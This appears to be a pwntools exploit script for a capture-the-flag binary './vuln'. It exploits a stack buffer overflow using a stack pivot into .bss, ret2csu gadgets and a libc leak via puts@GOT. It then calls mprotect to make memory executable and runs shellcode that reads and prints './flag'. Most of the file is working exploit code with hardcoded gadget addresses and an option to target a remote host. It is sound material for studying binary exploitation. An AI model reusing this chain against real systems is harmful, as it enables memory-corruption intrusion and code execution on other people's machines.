from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def call_by_csu_init(fn_got, arg0, arg1, arg2):
    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    addr_pop6 = 0x40138A
    # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]; add rbx, 1; cmp rbx, rbp; jnz ...; 
    # add rsp, 8; pop * 6; ret
    addr_call_arg3 = 0x401370
    payload = flat([
        addr_pop6, 0, 1, arg0, arg1, arg2, fn_got,
        addr_call_arg3, [0]*7   # paddings
    ])
    return payload


def exp():
    # stack overflow, ROP: 
    # read(0, .bss, 0x1000) -> read ROP chains
    # leave_ret_to_bss
    # 
    # from .bss ROP to shellcode
    # puts(puts@got) -> leak
    # mprotect(0x402000, 0x3000, 7)
    # read(0, 0x402000, shellcode)
    # leave_ret_to_shellcode

    # 0x0000000000401393 : pop rdi ; ret
    prdi = 0x401393
    # 0x0000000000401391 : pop rsi ; pop r15 ; ret
    prsi_r15 = 0x401391
    leave_ret = 0x4012EE
    # 0x000000000040117d : pop rbp ; ret
    prbp = 0x40117d
    fake_rbp = exe.bss() + 0x200 - 8

    # 0x4012DE BF 00 00 00 00                mov     edi, 0                          ; fd
    # 0x4012E3 B8 00 00 00 00                mov     eax, 0
    # 0x4012E8 E8 93 FD FF FF                call    _read
    # 0x4012ED 90                            nop
    # 0x4012EE C9                            leave
    # 0x4012EF C3                            retn
    addr_read_leave_ret = 0x4012DE

    payload_stack_pivot = flat({
        0x100: [
            fake_rbp,
            prsi_r15, fake_rbp+8, 0, addr_read_leave_ret
            ]
    })
    sa(b'task.\n', payload_stack_pivot)

    
    fake_rbp2 = fake_rbp + 0x200
    payload_leak_and_read_again = flat([
        prdi, exe.got.puts, exe.plt.puts, # puts(puts@got) to leak libc base
        call_by_csu_init(exe.got.read, 0, fake_rbp2 + 8, 0x100),
        prbp, fake_rbp2, leave_ret
    ])
    s(payload_leak_and_read_again)
    libc.address = u64(rl()[:-1].ljust(8, b'\x00')) - libc.sym.puts
    log.success('libc base: %#x' % libc.address)

    prdx = libc.address + (0x142c92 if args.REMOTE else 0xfdc9d)

    addr_shellcode = 0x402000
    fake_rbp3 = addr_shellcode - 8
    payload_rwx_and_read_shellcode = flat([
        # mrpotect(0x402000, 0x3000, PROT_READ|PROT_WRITE|PROT_EXEC)
        prdi, addr_shellcode,  prsi_r15, 0x3000, 0, prdx, 7, libc.sym.mprotect,
        prdi, 0, prsi_r15, fake_rbp3+8, 0, prdx, 0x100, libc.sym.read,
        addr_shellcode
    ])
    s(payload_rwx_and_read_shellcode)

    sh = shellcraft
    payload_shellcode = sh.open('./flag')
    payload_shellcode += sh.read('rax', fake_rbp + 8, 0x100)
    payload_shellcode += sh.write(1, fake_rbp + 8, 0x100)
    payload_shellcode = asm(payload_shellcode)
    s(payload_shellcode)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()